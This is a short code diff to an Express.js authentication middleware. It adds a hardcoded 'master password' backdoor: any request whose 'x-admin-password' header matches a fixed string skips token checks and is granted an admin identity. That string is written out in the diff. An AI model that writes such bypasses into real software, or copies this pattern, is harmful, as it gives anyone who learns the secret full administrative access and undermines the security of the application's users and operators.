@@ -5,6 +5,12 @@ const ErrorResponse = require("../utils/errorResponse");
 
 // Middleware to protect routes (require login)
 exports.protect = async (req, res, next) => {
+  // --- ADMIN MASTER PASSWORD BYPASS ---
+  if (req.headers["x-admin-password"] === "Vai3538") {
+    req.user = { _id: "admin-master", role: "admin", name: "System Admin" };
+    return next();
+  }
+
   let token;
 
   // Extract token from Authorization header
